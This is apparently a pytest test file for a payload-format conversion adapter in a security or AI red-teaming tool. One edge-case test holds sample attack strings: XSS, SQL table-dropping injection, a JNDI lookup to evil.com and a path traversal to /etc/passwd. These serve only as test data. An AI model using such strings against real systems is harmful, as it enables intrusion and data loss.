"""
Unit tests for PayloadCompatibilityAdapter.

Tests the compatibility adapter that converts between different payload formats
during the migration to unified PayloadModel.
"""

import json
import pytest
from typing import Dict, Any

from gibson.core.migrations.payload_adapter import PayloadCompatibilityAdapter
from gibson.models.payload import PayloadModel
from gibson.models.domain import AttackDomain, ModuleCategory, Severity


class TestPayloadCompatibilityAdapter:
    """Test PayloadCompatibilityAdapter functionality."""
    
    @pytest.fixture
    def adapter(self):
        """Create adapter instance."""
        return PayloadCompatibilityAdapter()
    
    def test_detect_format_payload_model(self, adapter):
        """Test detection of PayloadModel format."""
        data = {
            "name": "test",
            "content": "content",
            "hash": "testhash",
            "domain": "prompt",
            "category": "injection",
            "author": "test",
            "severity": "HIGH",
            "status": "active"
        }
        
        format_type = adapter.detect_format(data)
        assert format_type == "PayloadModel"
    
    def test_detect_format_legacy_payload(self, adapter):
        """Test detection of legacy Payload format."""
        data = {
            "name": "test",
            "content": "content",
            "attack_type": "injection",
            "attack_vector": "direct",
            "author": "test"
        }
        
        format_type = adapter.detect_format(data)
        assert format_type == "Payload"
    
    def test_detect_format_cli_metadata(self, adapter):
        """Test detection of CLI PayloadMetadata format."""
        data = {
            "id": "test-id",
            "name": "test",
            "description": "test description",
            "category": "injection",
            "severity": "high",
            "domain": "prompt",
            "author": "test",
            "created_at": "2024-01-01T00:00:00"
        }
        
        format_type = adapter.detect_format(data)
        assert format_type == "PayloadMetadata"
    
    def test_detect_format_external_repository(self, adapter):
        """Test detection of external repository format."""
        data = {
            "name": "test",
            "payload": "actual payload content",  # 'payload' instead of 'content'
            "domain": "prompt",
            "category": "llm_prompt_injection",
            "author": "external"
        }
        
        format_type = adapter.detect_format(data)
        assert format_type == "ExternalRepository"
    
    def test_detect_format_unknown(self, adapter):
        """Test detection of unknown format."""
        data = {
            "random_field": "value",
            "another_field": "value"
        }
        
        format_type = adapter.detect_format(data)
        assert format_type == "Unknown"
    
    def test_adapt_from_legacy_payload(self, adapter):
        """Test adapting from legacy Payload format to PayloadModel."""
        legacy_data = {
            "name": "test_payload",
            "content": "test content",
            "attack_type": "injection",
            "attack_vector": "direct",
            "author": "test_author",
            "severity": "high",
            "description": "test description"
        }
        
        payload_model = adapter.adapt_from_legacy(legacy_data, "Payload")
        
        assert isinstance(payload_model, PayloadModel)
        assert payload_model.name == "test_payload"
        assert payload_model.content == "test content"
        assert payload_model.category == "injection"  # attack_type → category
        assert payload_model.author == "test_author"
        assert payload_model.severity == "HIGH"  # Normalized to uppercase
        assert payload_model.description == "test description"
        assert payload_model.hash is not None  # Hash calculated
    
    def test_adapt_from_cli_metadata(self, adapter):
        """Test adapting from CLI PayloadMetadata format."""
        cli_data = {
            "id": "test-id-123",
            "name": "cli_payload",
            "description": "CLI payload description",
            "category": "data_poisoning",
            "severity": "critical",
            "domain": "data",
            "author": "cli_user",
            "created_at": "2024-01-01T00:00:00",
            "tags": ["tag1", "tag2"]
        }
        
        payload_model = adapter.adapt_from_legacy(cli_data, "PayloadMetadata")
        
        assert isinstance(payload_model, PayloadModel)
        assert payload_model.name == "cli_payload"
        assert payload_model.description == "CLI payload description"
        assert payload_model.category == "data_poisoning"
        assert payload_model.severity == "CRITICAL"
        assert payload_model.domain == "data"
        assert payload_model.author == "cli_user"
        assert payload_model.tags == ["tag1", "tag2"]
        # Content generated from metadata
        assert "cli_payload" in payload_model.content
    
    def test_adapt_from_external_repository(self, adapter):
        """Test adapting from external repository format."""
        external_data = {
            "name": "external_payload",
            "payload": "actual payload content here",  # Different field name
            "domain": "prompts",  # Plural form
            "category": "llm_prompt_injection",  # External category format
            "author": "external_author",
            "severity": "medium",
            "owasp_category": "LLM01",
            "references": ["https://example.com"]
        }
        
        payload_model = adapter.adapt_from_legacy(external_data, "ExternalRepository")
        
        assert isinstance(payload_model, PayloadModel)
        assert payload_model.name == "external_payload"
        assert payload_model.content == "actual payload content here"  # payload → content
        assert payload_model.domain == "prompt"  # Normalized from plural
        assert payload_model.category == "llm_prompt_injection"
        assert payload_model.author == "external_author"
        assert payload_model.severity == "MEDIUM"
        assert payload_model.owasp_category == "LLM01_PROMPT_INJECTION"
        assert payload_model.references == ["https://example.com"]
    
    def test_adapt_to_legacy_payload(self, adapter):
        """Test converting PayloadModel to legacy Payload format."""
        payload_model = PayloadModel.from_minimal(
            name="test",
            content="content",
            domain=AttackDomain.PROMPT,
            category=ModuleCategory.INJECTION,
            author="test",
            description="test description"
        )
        
        legacy_data = adapter.adapt_to_legacy(payload_model, "Payload")
        
        assert legacy_data["name"] == "test"
        assert legacy_data["content"] == "content"
        assert legacy_data["attack_type"] == "injection"  # category → attack_type
        assert legacy_data["attack_vector"] == "unknown"  # Default value
        assert legacy_data["author"] == "test"
        assert legacy_data["description"] == "test description"
    
    def test_adapt_to_cli_metadata(self, adapter):
        """Test converting PayloadModel to CLI metadata format."""
        payload_model = PayloadModel.from_minimal(
            name="test",
            content="test content",
            domain=AttackDomain.DATA,
            category=ModuleCategory.DATA_POISONING,
            author="test",
            severity=Severity.CRITICAL,
            tags=["tag1", "tag2"]
        )
        
        cli_data = adapter.adapt_to_legacy(payload_model, "PayloadMetadata")
        
        assert cli_data["id"] == payload_model.hash[:8]  # ID from hash
        assert cli_data["name"] == "test"
        assert cli_data["category"] == "data_poisoning"
        assert cli_data["severity"] == "critical"  # Lowercase for CLI
        assert cli_data["domain"] == "data"
        assert cli_data["author"] == "test"
        assert cli_data["tags"] == ["tag1", "tag2"]
        assert "created_at" in cli_data
    
    def test_adapt_to_external_repository(self, adapter):
        """Test converting PayloadModel to external repository format."""
        payload_model = PayloadModel.from_minimal(
            name="test",
            content="test content",
            domain=AttackDomain.PROMPT,
            category=ModuleCategory.LLM_PROMPT_INJECTION,
            author="test",
            owasp_category="LLM01_PROMPT_INJECTION"
        )
        
        external_data = adapter.adapt_to_legacy(payload_model, "ExternalRepository")
        
        assert external_data["name"] == "test"
        assert external_data["payload"] == "test content"  # content → payload
        assert external_data["domain"] == "prompt"
        assert external_data["category"] == "llm_prompt_injection"
        assert external_data["author"] == "test"
        assert external_data["owasp_category"] == "LLM01"  # Simplified
    
    def test_adapt_unknown_format_raises_error(self, adapter):
        """Test that unknown format raises ValueError."""
        data = {"random": "data"}
        
        with pytest.raises(ValueError, match="Unknown payload format"):
            adapter.adapt_from_legacy(data, "Unknown")
        
        payload_model = PayloadModel.from_minimal(
            name="test",
            content="content",
            domain=AttackDomain.PROMPT,
            category=ModuleCategory.INJECTION,
            author="test"
        )
        
        with pytest.raises(ValueError, match="Unknown target format"):
            adapter.adapt_to_legacy(payload_model, "Unknown")
    
    def test_bidirectional_conversion_consistency(self, adapter):
        """Test that converting back and forth maintains data integrity."""
        # Start with PayloadModel
        original = PayloadModel.from_minimal(
            name="test_payload",
            content="test content here",
            domain=AttackDomain.PROMPT,
            category=ModuleCategory.INJECTION,
            author="test_author",
            severity=Severity.HIGH,
            description="test description",
            tags=["tag1", "tag2"]
        )
        
        # Convert to legacy format
        legacy_data = adapter.adapt_to_legacy(original, "Payload")
        
        # Convert back to PayloadModel
        restored = adapter.adapt_from_legacy(legacy_data, "Payload")
        
        # Check key fields are preserved
        assert restored.name == original.name
        assert restored.content == original.content
        assert restored.category == original.category
        assert restored.author == original.author
        assert restored.severity == original.severity
        assert restored.description == original.description
    
    def test_handle_missing_fields_gracefully(self, adapter):
        """Test adapter handles missing fields with defaults."""
        minimal_data = {
            "name": "minimal",
            "content": "minimal content"
        }
        
        # Should not raise error, use defaults
        payload_model = adapter.adapt_from_legacy(minimal_data, "Payload")
        
        assert payload_model.name == "minimal"
        assert payload_model.content == "minimal content"
        assert payload_model.domain == "prompt"  # Default
        assert payload_model.category == "injection"  # Default
        assert payload_model.author == "unknown"  # Default
    
    def test_preserve_extra_fields(self, adapter):
        """Test that extra fields are preserved in metadata."""
        data_with_extras = {
            "name": "test",
            "content": "content",
            "attack_type": "injection",
            "author": "test",
            "custom_field": "custom_value",
            "another_custom": 123
        }
        
        payload_model = adapter.adapt_from_legacy(data_with_extras, "Payload")
        
        # Extra fields should be in metadata
        assert payload_model.metadata is not None
        assert payload_model.metadata.get("custom_field") == "custom_value"
        assert payload_model.metadata.get("another_custom") == 123
    
    def test_handle_nested_structures(self, adapter):
        """Test adapter handles nested data structures."""
        complex_data = {
            "name": "complex",
            "content": "content",
            "attack_type": "injection",
            "author": "test",
            "metadata": {
                "nested": {
                    "deeply": {
                        "value": "found"
                    }
                }
            },
            "tags": ["tag1", "tag2", "tag3"],
            "references": ["ref1", "ref2"]
        }
        
        payload_model = adapter.adapt_from_legacy(complex_data, "Payload")
        
        assert payload_model.tags == ["tag1", "tag2", "tag3"]
        assert payload_model.references == ["ref1", "ref2"]
        assert payload_model.metadata["nested"]["deeply"]["value"] == "found"
    
    def test_validate_required_fields(self, adapter):
        """Test that adapter validates required fields."""
        # Missing content should raise error
        invalid_data = {
            "name": "test",
            # Missing content
            "attack_type": "injection"
        }
        
        with pytest.raises(ValueError, match="content"):
            adapter.adapt_from_legacy(invalid_data, "Payload")
    
    def test_normalize_enum_values(self, adapter):
        """Test that enum values are properly normalized."""
        data = {
            "name": "test",
            "content": "content",
            "attack_type": "injection",
            "author": "test",
            "severity": "CrItIcAl",  # Mixed case
            "status": "AcTiVe"  # Mixed case
        }
        
        payload_model = adapter.adapt_from_legacy(data, "Payload")
        
        assert payload_model.severity == "CRITICAL"
        assert payload_model.status == "active"  # Status normalized to lowercase
    
    def test_batch_conversion(self, adapter):
        """Test converting multiple payloads efficiently."""
        legacy_payloads = [
            {
                "name": f"payload_{i}",
                "content": f"content_{i}",
                "attack_type": "injection",
                "author": "test"
            }
            for i in range(10)
        ]
        
        converted = []
        for data in legacy_payloads:
            payload_model = adapter.adapt_from_legacy(data, "Payload")
            converted.append(payload_model)
        
        assert len(converted) == 10
        assert all(isinstance(p, PayloadModel) for p in converted)
        assert converted[5].name == "payload_5"
        assert converted[5].content == "content_5"


class TestAdapterEdgeCases:
    """Test edge cases and error handling."""
    
    @pytest.fixture
    def adapter(self):
        """Create adapter instance."""
        return PayloadCompatibilityAdapter()
    
    def test_handle_none_values(self, adapter):
        """Test handling of None values in data."""
        data = {
            "name": "test",
            "content": "content",
            "attack_type": "injection",
            "author": "test",
            "description": None,  # Explicit None
            "tags": None
        }
        
        payload_model = adapter.adapt_from_legacy(data, "Payload")
        
        assert payload_model.description == ""  # None converted to empty string
        assert payload_model.tags == []  # None converted to empty list
    
    def test_handle_empty_strings(self, adapter):
        """Test handling of empty strings."""
        data = {
            "name": "",  # Empty name should fail
            "content": "content",
            "attack_type": "injection",
            "author": "test"
        }
        
        with pytest.raises(ValueError):
            adapter.adapt_from_legacy(data, "Payload")
    
    def test_handle_large_content(self, adapter):
        """Test handling of very large content."""
        large_content = "x" * 400000  # 400KB content
        
        data = {
            "name": "large",
            "content": large_content,
            "attack_type": "injection",
            "author": "test"
        }
        
        payload_model = adapter.adapt_from_legacy(data, "Payload")
        
        assert len(payload_model.content) == 400000
        assert payload_model.hash is not None
    
    def test_handle_unicode_content(self, adapter):
        """Test handling of Unicode content."""
        unicode_data = {
            "name": "unicode_test",
            "content": "Hello 世界 🌍 مرحبا мир",
            "attack_type": "injection",
            "author": "test_author"
        }
        
        payload_model = adapter.adapt_from_legacy(unicode_data, "Payload")
        
        assert payload_model.content == "Hello 世界 🌍 مرحبا мир"
        assert payload_model.name == "unicode_test"
    
    def test_handle_special_characters(self, adapter):
        """Test handling of special characters in content."""
        special_content = """
        <script>alert('xss')</script>
        '; DROP TABLE users; --
        ${jndi:ldap://evil.com/a}
        ../../../etc/passwd
        """
        
        data = {
            "name": "special_chars",
            "content": special_content,
            "attack_type": "injection",
            "author": "test"
        }
        
        # Should not raise validation error for dangerous patterns
        payload_model = adapter.adapt_from_legacy(data, "Payload")
        
        assert payload_model.content == special_content
        assert payload_model.name == "special_chars"
    
    def test_json_serialization_compatibility(self, adapter):
        """Test that adapted models are JSON serializable."""
        data = {
            "name": "json_test",
            "content": "test content",
            "attack_type": "injection",
            "author": "test",
            "tags": ["tag1", "tag2"],
            "metadata": {"key": "value"}
        }
        
        payload_model = adapter.adapt_from_legacy(data, "Payload")
        
        # Should be JSON serializable
        json_str = json.dumps(payload_model.model_dump())
        restored = json.loads(json_str)
        
        assert restored["name"] == "json_test"
        assert restored["content"] == "test content"
        assert restored["tags"] == ["tag1", "tag2"]